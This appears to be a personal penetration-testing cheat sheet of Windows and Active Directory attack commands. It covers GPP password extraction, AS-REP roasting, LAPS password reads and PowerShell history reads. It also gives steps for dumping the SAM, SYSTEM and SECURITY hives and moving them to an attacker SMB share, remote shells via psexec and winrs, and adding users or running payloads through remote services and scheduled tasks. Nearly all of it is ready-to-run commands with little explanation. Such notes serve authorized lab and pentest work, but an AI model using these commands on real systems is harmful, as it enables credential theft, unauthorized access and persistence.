### Exploit Suggester Tools
```
1)Winpeas
2)Seabelt
3)Wattson
4)Sharpup
```

### Check for Passwords in GPO under SYSVOL or similar
```
impacket-Get-GPPPassword <FQDN> -s <share>
```

### Check for AS-REPRoast users
(users without kerberos pre-auth required)
```
GetNPUsers.py contoso.com/ -usersfile usernames.txt -format hashcat
```

### Steal admin password from LAPS 
(if your account is part of LAPS reader or similar)
```
crackmapexec smb IP -u USER -d DOMAIN.COM -p CLEAR-TEXT -M laps
```

### Check Powershell history
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### How to dump Passwords from SAM 
```
    //Create  a share on your VM
    smbserver.py sharename . -smb2support -username user -password s3cureP@ssword

    //Connect share on victim vm
    net use \\10.50.63.2\share /USER:user s3cureP@ssword

    //Dump passwords to share
    reg.exe save HKLM\SAM sam.bak
    reg.exe save HKLM\SYSTEM system.bak
    reg.exe save HKLM\SECURITY security.bak

    //Move bak to SMB Share to your Kali
    net use \\<ip>\<share> /USER:<username> <password>
    move sam.bak \\<ip>\<share> 
    move system.bak \\<ip>\<share> 
    move security.bak \\<ip>\<share> 

    //Extract passwords on our Kali
    sudo python3 ~/Tools/impacket/examples/secretsdump.py -sam sam.bak -security security.bak -system system.bak LOCAL
```

### Run Reverse Shell with PSexec
```
    Ports: 445/TCP (SMB)
    Required Group Memberships: Administrators

psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

### Run Reverse Shell with WinRM
```
    Ports: 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
    Required Group Memberships: Remote Management User
	
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```

### Create a new user remotely with a new Windows Service
```
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
```

#### Run a task with taskmanager
```
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 
schtasks /s TARGET /run /TN "THMtask1" 
```